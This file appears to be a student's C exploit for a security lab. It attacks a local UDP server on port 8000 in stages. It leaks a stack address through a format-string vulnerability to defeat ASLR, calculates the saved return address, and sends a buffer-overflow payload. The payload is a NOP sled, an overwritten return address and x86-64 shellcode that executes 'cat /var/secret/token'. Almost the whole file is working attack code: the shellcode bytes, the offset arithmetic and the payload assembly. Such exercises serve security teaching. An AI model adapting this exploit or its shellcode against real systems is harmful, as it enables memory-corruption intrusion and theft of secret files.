/* exploit_1.c  */

/* Creates a file containing code for executing "cat /var/secret/token" */
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <unistd.h>


char shellcode[]=		/*Size = 69bytes*/
  "\x48\x31\xc0"				/* xor     rax,rax			*/
  "\x50"					/* push    rax				*/
  "\x48\xbb\x2f\x2f\x2f\x74\x6f\x6b\x65\x6e"	/* mov     rbx,0x6e656b6f742f2f2f	*/
  "\x53"					/* push    rbx				*/
  "\x48\xbb\x73\x65\x63\x72\x65\x74\x2f\x2f"	/* mov     rbx,0x2f2f746572636573	*/
  "\x53"					/* push    rbx				*/
  "\x48\xbb\x2f\x76\x61\x72\x2f\x2f\x2f\x2f"	/* mov     rbx,0x2f2f2f2f7261762f	*/
  "\x53"					/* push    rbx				*/
  "\x48\x89\xe1"				/* mov     rcx,rsp			*/
  "\x50"					/* push    rax				*/
  "\x48\xbb\x2f\x62\x69\x6e\x2f\x63\x61\x74"	/* mov     rbx,0x7461632f6e69622f	*/
  "\x53"					/* push    rbx				*/
  "\x48\x89\xe7"				/* mov     rdi,rsp			*/
  "\x50"					/* push    rax				*/
  "\x51"					/* push    rcx				*/
  "\x57"					/* push    rdi				*/
  "\x48\x31\xd2"				/* xor     rdx,rdx			*/
  "\x48\x89\xe6"				/* mov     rsi,rsp			*/
  "\xb0\x3b"					/* mov     al,0x3b			*/
  "\x0f\x05"					/* syscall				*/
;

int main(int argc, char **argv)
{
  struct sockaddr_in addr;
  struct sockaddr* saddr = (struct sockaddr*) &addr;
  struct sockaddr_in srv_addr;
  struct sockaddr* srv_saddr = (struct sockaddr*) &srv_addr;
  socklen_t srv_addr_size = sizeof(srv_addr);
  int sockfd;
  ssize_t rcvsize;


  /* Create a UDP socket to communicate with the target server. */
  sockfd = socket(AF_INET,SOCK_DGRAM,IPPROTO_UDP);
  bzero(&srv_addr, sizeof(srv_addr));
  srv_addr.sin_family = AF_INET;
  srv_addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
  srv_addr.sin_port = htons(8000);


  /* TODO: put your code here */


  /*
	I want bof() in stack.c to return to just after the rip is stored.
	So, I  want rip = rip_address + 8 (&rip+8).
	I know rip is located always in buffer_addres + 72.
	Null-byte at begginig of payload so sprintf does not overwrite buffer.
	no-op code in [buffer_addr + 1, buffer_addr + 72] (so 72 no-op's)
	new_return_addr in [buffer_addr + 72, buffer_addr + 80]
	no-ops to be nicer in [buffer_addr + 80, buffer_addr + 112]
	shellcode in  [buffer_addr + 112, buffer_addr + 181]
   
  */

  printf("Starting buffer overflow attack... \n");
  //Input to the stack.c sprintf to get a long value of the str_addr
  char printf_vuln[]= "%lu";

  //Init payload
  char payload[181];
  bzero(payload, sizeof(payload));

  //Variables to store corresponding addresses, in long and byte-like types.
  char str_addr [6];
  bzero(str_addr, 6);
  long   str_addr_num;

  char resp_addr[6] ;
  bzero(resp_addr, 6);
  long   resp_addr_num;

  char rip_addr[6] ;
  bzero(rip_addr, 6);
  long   rip_addr_num;

  char shellcode_addr[8];
  bzero(shellcode_addr, 6);
  long   shellcode_addr_num;

  char resp[32];
  bzero(resp, sizeof(resp));

  printf("Exploting format string vulnerability... \n");
  
  for(int i = 0; i<3; i++){
  		printf(". \n");
		sleep(1);
  }

  //Send sprintf format vulnerability in order to get str_addr back
  sendto(sockfd, &printf_vuln, sizeof(printf_vuln), 0, srv_saddr, srv_addr_size);

  //Recieving str_addr
  rcvsize = recvfrom(sockfd, resp, sizeof(resp), MSG_WAITALL, NULL, NULL);
  printf("[Finished] Found base address: %p \n", resp);
  

  printf("Defeating ASLR... \n");
  
  for(int i = 0; i<2; i++){
  		printf(". \n");
		sleep(1);
  }

  //Calculate resp_address location in stack.c
	  //1) Transform to integer, 2) add 1008, 3)transform back to %p
  str_addr_num = atol(resp);
  memcpy(str_addr,&str_addr_num,6);

  resp_addr_num = str_addr_num + 1008;
  memcpy(resp_addr,&resp_addr_num,6);

  //Calculate rip address
  rip_addr_num = resp_addr_num + 104;
  memcpy(rip_addr,&rip_addr_num,6);
  printf("[Finished] Found rip address: %p \n", rip_addr);

  //Calculate addr where shellcode should be placed at
  printf("Calculating shellcode's location...\n");
  
  for(int i = 0; i<2; i++){
  		printf(". \n");
		sleep(1);
  }

  shellcode_addr_num = rip_addr_num + 8;
  memcpy(shellcode_addr, &shellcode_addr_num, 6);
  memset(shellcode_addr + 6, 0x00, 2); 
  printf("[Finished] Shellcode's location: %p \n", shellcode_addr);

  //Craft payload
  printf("Crafting exploit payload... \n");
  
  for(int i = 0; i<3; i++){
  		printf(". \n");
		sleep(1);
  }

	  //1 Fill with a 0x00 so sprintf doesnt do anything
	  memset(payload, 0x00,1);
	  //2 Fill in with no ops till address holding RIP
	  memset(payload + 1, 0x90, 71);
	  //3 Replace RIP with RIP+8
	  memcpy(payload + 72, shellcode_addr, 8);
	  //4 Fill with no-ops at RIP + 8 so its "nice"
	  memset(payload + 80, 0x90, 32);
	  //5 Insert shellcode after no-ops
	  memcpy(payload + 112, &shellcode, 69);

  //Send payload
  printf("[Finished] Executing exploit... \n");
  
  for(int i = 0; i<5; i++){
  		printf(". \n");
		sleep(1);
  }

  sendto(sockfd, &payload, sizeof(payload), 0, srv_saddr, srv_addr_size);

  printf("Attack successful!!! \n");
  return 0;
}
